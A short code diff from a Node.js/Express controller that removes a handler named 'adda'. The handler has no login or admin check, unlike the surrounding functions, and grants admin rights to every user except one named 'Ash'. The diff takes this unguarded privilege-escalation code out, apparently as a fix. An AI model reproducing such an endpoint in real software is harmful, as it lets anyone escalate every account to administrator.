@@ -102,17 +102,6 @@ module.exports.toggleAdmin = async (req, res) => {
     })
 }
 
-module.exports.adda = async (req, res) => {
-    const user = await userdb.find();
-    user.forEach((user) => {
-        if (user.username != "Ash") {
-            user.admin = true;
-            user.save();
-        }
-    })
-    res.json(user.length);
-}
-
 module.exports.reset = async (req, res) => {
     isLoggedIn(req, res, async () => {
         isAdmin(req, res, async () => {
